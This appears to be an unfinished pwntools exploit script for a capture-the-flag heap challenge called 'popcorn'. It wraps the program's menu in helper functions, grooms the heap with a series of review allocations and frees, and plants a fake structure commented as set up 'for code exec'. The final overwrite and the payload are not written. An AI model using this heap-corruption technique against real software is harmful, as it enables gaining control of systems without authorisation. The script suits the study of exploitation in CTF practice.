#!/usr/bin/env python3

from pwn import *

exe = ELF("./popcorn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

r = process([exe.path])

def sl(data):
    r.sendlineafter("> ", data)

def s(data):
    r.sendafter("> ", data)

def create(title):
    sl("1")
    s(title)
        
def edit(index):
    sl("2")
    sl(str(index))

def edit_title(index, new_title):
    edit(index)
    sl("1")
    s(new_title)

def create_review(index, size, review=b"", rate=-1, ):
    edit(index)
    sl("2")
    sl(str(size))
    if (rate == -1):
        sl("n")
        s(review)
    else:
        sl("y")
        sl(str(rate))
        s(review)

def edit_review(index, rate_index, data):
    edit(index)
    sl("3")
    sl(str(rate_index))
    s(data)

def delete_review(index, rate_index):
    edit(index)
    sl("4")
    sl(str(rate_index))



def conn():
    return r


def main():
    r = conn()
    
    create("MAHER")
    for i in range(11 + 1):
        create_review(0, 0x20, b"M"*0x1f, rate=4)
   
    for i in range(10 + 1, 3, -1):
        print(i)
        delete_review(0, i)
    
    delete_review(0, 4 + 1)
    pause()

    # movie 1 to be modified for code exec
    create(p64(0)*2 + p32(0x00040000))

    # modify rate 4 in movie 0

    r.interactive()


if __name__ == "__main__":
    main()
